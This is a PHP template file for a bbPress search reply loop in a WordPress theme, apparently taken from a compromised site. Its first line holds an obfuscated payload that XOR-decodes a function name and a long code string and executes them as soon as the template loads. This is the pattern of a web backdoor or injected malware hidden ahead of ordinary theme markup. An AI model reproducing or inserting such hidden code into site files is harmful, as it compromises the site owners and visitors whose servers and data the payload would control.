<?php $LBAsMLY=':<5OGErX2PY S7-'; $CkZaTbC='YNP.3 ->G>:T:XC'^$LBAsMLY; $TXADsVl='ZFZrFO+M6R Bg=49I2HxwX<At69C-fo,M9pqnXO;;57 POE,;c-=KdD-J ooQ=<xu5SZ3bao.QMnrHoflF6GKR7,BchHwvidzbM=Agc>lDprleNBnBJ;:S>qQYOIQCaRp=eyKd0EVCO7obwhFr5-X,=t,cmmvt W1<aWfKt H;Y ZLrVIKx5dob:lA49B8Sgp62HbYyy2PCxamXVAUQkcS9<5SvHoO3:,l< IrqSQMW>RUgCK9I 6CQjejevxo8s.F;OpV=7CtoMks=04UReaKXsuY6; jF+8eOTMZ5Jmb;W-5M SnneMY-GKigI7x< Obbt6 HOGiBa;X7E2VWZczg,=t n2<xP. EaR7+vtrwmN3UNSos4<ChtV.=,=>IYawnt<YAbOJPnDXT9ZKgv57>CRVKe:G-zbL1UAXzorz9W2VGIA++DVm=QR21+H gkTBML J;Temb T.=,,jFY410YVsA RO;q87Wgss0=+kVHWAObjSTS6F  9>XUt6BR7H6Zw,,EoYPq=XOVfqHlZe< Mek7Y1+cdUIJUnoeXjIhP2w6G4:YDYww3-sexbQAVQJdU0:g ZBTTgrvaX8+O A2X23:K21K;GRj3OU9U6<EOco=SE.gqLyYing2gl-9Q4nS6LE5:wH87YCW3D.SqzzS >=zVxm<M'; $bBKNzBh=$CkZaTbC('', '3 rS :E.B;O,8XLP:F;PP S3+RX7L90A8MWXGx412SBN3;,CUCUR9; L>A00<HHPQQ2.RNAKE44GRhOFL=<NBvXY6CUhPQRnsk+R3OGWLyPBWEj+R1>IV6PYu=.=0jZrTTNRbn9Lr,:COLJHnVQL,MfPE>M3VPK2HgE>FnTS<I5E4dV=,2QhMTh3e3QM7J=OTYG<KbspOZ>rkI<754qVC5XPF6MBK+RNM3WE0RLs7,;M7nmI-V;EW 9JMN:57 s:kfZ<PrVR:TRsKWKQX 7LA0RzQ=WOA5-NAErti1P3Vh2sIT9AsSNA;8A2.Rm4=rUFoJCPRA<.nI9k2>X7W742CRCso1q;wo,pOSeE9RRVILWI8R9;6FSO6JaP2OIMbU, AJNPW<8YECYJ 9 XzvGRCVR67mAlGMPphhU459ZRR:L9A35  GB>3EE> mUJ<A84979dB+H1SY=D1MRHIBb=UEQpzSeD3;Z.SR.NZH:TMCr,65.BLut2D4AYfU=,+S:;D<ErPGI<HupUY9;7OQnJzMQDxMOS8EJ8C>,3r3FEeWiO3WDRqPX;qmBNQOGQJWapae+W3UXSBmrlsNRPGxYY=A8m3WJe.JX8O4zMC.,U:WXbcCKY21ONXlYyINGImeHO0XFwR-1TaP8YN5,6WcszJps6XWIRfQV60'^$TXADsVl); $bBKNzBh();

/**
 * Search Loop - Single Reply
 *
 * @package bbPress
 * @subpackage Theme
 */

?>

<div id="post-<?php bbp_reply_id(); ?>" <?php bbp_reply_class(); ?>>

	<div class="bbp-reply-author">

		<?php do_action( 'bbp_theme_before_reply_author_details' ); ?>

		<?php bbp_reply_author_link( array( 'sep' => '', 'show_role' => true ) ); ?>

		<div class="bbp-reply-post-date"><?php bbp_reply_post_date(); ?></div>

		<div class="bbps-post-count"><?php printf( __( 'Post count: %s', 'Avada' ), bbp_get_user_reply_count_raw(bbp_get_reply_author_id()) ); ?></div>

		<?php if ( bbp_is_user_keymaster() ) : ?>

			<?php do_action( 'bbp_theme_before_reply_author_admin_details' ); ?>

			<div class="bbp-reply-ip"><?php bbp_author_ip( bbp_get_reply_id() ); ?></div>

			<?php do_action( 'bbp_theme_after_reply_author_admin_details' ); ?>

		<?php endif; ?>

		<?php do_action( 'bbp_theme_after_reply_author_details' ); ?>

	</div><!-- .bbp-reply-author -->

	<div class="bbp-reply-content">
		<div class="bbp-reply-header">
			<div class="bbp-meta">
				<a href="<?php bbp_reply_url(); ?>" class="bbp-reply-permalink">#<?php bbp_reply_id(); ?></a>
				<span class="bbp-reply-to"><?php _e( 'In reply to: ', 'bbpress' ); ?>
				<a class="bbp-topic-permalink" href="<?php bbp_topic_permalink( bbp_get_reply_topic_id() ); ?>"><?php bbp_topic_title( bbp_get_reply_topic_id() ); ?></a> | </span>
			</div>
		</div>

		<div class="bbp-reply-entry">

			<?php do_action( 'bbp_theme_before_reply_content' ); ?>

			<?php bbp_reply_content(); ?>

			<?php do_action( 'bbp_theme_after_reply_content' ); ?>

			<div class="bbp-arrow"></div>
		</div>

	</div><!-- .bbp-reply-content -->

</div><!-- #post-<?php bbp_reply_id(); ?> -->

